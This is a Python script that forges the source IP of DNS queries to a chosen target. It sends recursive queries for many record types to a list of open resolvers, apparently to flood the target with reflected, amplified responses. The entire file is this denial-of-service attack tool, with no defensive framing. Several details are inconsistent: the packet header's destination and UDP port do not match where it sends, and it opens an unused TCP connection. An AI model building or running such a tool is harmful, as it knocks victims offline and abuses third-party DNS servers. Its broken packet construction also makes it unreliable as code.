import dns.resolver
import dns.message
import dns.query
import socket
import struct
import time

# Define the target IP and port
target_ip = input("Enter target IP address: ")
target_port = int(input("Enter target port: "))

# Define the source IP address to spoof
spoofed_ip = target_ip

# Prompt the user to enter the server IP address and port
server_ip = input("Enter server IP address: ")
server_port = int(input("Enter server port: "))

# Define the list of record types to query
record_types = ["A", "AAAA", "MX", "NS", "SOA", "SRV", "TXT", "CNAME", "PTR"]

# Step 1: Read list of working DNS servers from file then read list of domains from file
try:
    with open("workingdns.txt", "r") as f:
        nameservers = [line.strip() for line in f]
except IOError as e:
    print(f"Error reading file: {e}")
    exit(1)

try:
    with open("domains.txt", "r") as f:
        domains = [line.strip() for line in f]
except IOError as e:
    print(f"Error reading file: {e}")
    exit(1)

# Step 2: Connect to the server and send DNS queries from the spoofed target IP
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
    try:
        server_socket.connect((server_ip, server_port))
    except OSError as e:
        print(f"Error connecting to server: {e}")
        exit(1)

    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW) as s:
        try:
            s.bind((spoofed_ip, 0))
        except OSError as e:
            print(f"Error binding socket: {e}")
            exit(1)

        # Set the socket timeout to 1 second
        s.settimeout(1.0)

        for domain in domains:
            for record_type in record_types:
                # Create the DNS query message
                query = dns.message.make_query(domain, record_type)
                query.flags |= dns.flags.RD

                # Spoof the source IP address
                ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 20+len(query.to_wire()), 12345, 0, 64, socket.IPPROTO_UDP, 0, socket.inet_aton(spoofed_ip), socket.inet_aton(server_ip))

                # Create the UDP header
                udp_header = struct.pack('!HHHH', 1234, server_port, 8+len(query.to_wire()), 0)

                # Send the query to the name server using UDP
                for nameserver in nameservers:
                    try:
                        s.sendto(ip_header + udp_header + query.to_wire(), (nameserver, 53))
                    except OSError as e:
                        print(f"Error sending query: {e}")
                        continue
                    else:
                        print(f"Sent query for {domain} ({record_type}) from {spoofed_ip} to {nameserver}")
                        # Wait for 1 millisecond before sending the next query
                        time.sleep(0.001)
